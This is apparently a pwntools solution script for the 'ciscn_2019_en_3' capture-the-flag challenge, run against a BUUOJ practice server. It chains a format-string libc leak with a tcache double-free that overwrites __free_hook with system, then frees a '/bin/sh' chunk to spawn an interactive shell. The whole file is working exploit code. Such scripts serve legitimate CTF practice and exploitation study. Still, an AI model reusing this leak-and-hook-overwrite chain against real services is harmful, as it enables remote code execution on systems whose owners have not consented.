from pwn import *
context.log_level = 'debug'

elf = ELF('./ciscn_2019_en_3')
# io = process(['glibc_run', '2.27', './ciscn_2019_en_3'])
io = remote('node5.buuoj.cn', 26164)

def get_process_pid(name):
    pid_list = []
    processes = os.popen('ps -ef | grep %s' % name)
    process_info = processes.read()
    for i in process_info.split('\n')[:-1]:
        j = re.split(' +', i)
        if j[7] == name:
            pid_list.append(int(j[1]))
    return pid_list[0]

def add(size, content):
	io.sendlineafter(b'Input your choice:', b'1')
	io.sendlineafter(b'Please input the size of story: \n', str(size).encode())
	io.sendlineafter(b'please inpute the story: \n', content)
	
def delete(index):
	io.sendlineafter(b'Input your choice:', b'4')
	io.sendlineafter(b'Please input the index:\n', str(index).encode())

io.sendlineafter(b'What\'s your name?\n', b'%c%c%c%c%c%c%llx' + packing.p64(0) * 2)	# 0x680
io.recv(6)
libc_base = int(io.recv(12).decode(), 16) - 0x3ec680
system = libc_base + 0x4f440
__malloc_hook = libc_base + 0x3ebc30
__free_hook = libc_base + 0x3ed8e8
realloc = libc_base + 0x98c30
# io.sendlineafter(b'ID.\n', b'flag')
print("libc_base: " + hex(libc_base))
for i in range(9):
	add(0x60, b'a')
for i in range(7):
	delete(i)
delete(7)
delete(8)
delete(7)
for i in range(7):
	add(0x60, b'a')
one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
add(0x60, packing.p64(__free_hook))
add(0x60, b'1')
add(0x60, b'1')
add(0x60, packing.p64(system))
# gdb.attach(get_process_pid('./ciscn_2019_en_3'))
# time.sleep(1)
add(0x60, b'/bin/sh\x00')
delete(20)

io.interactive()
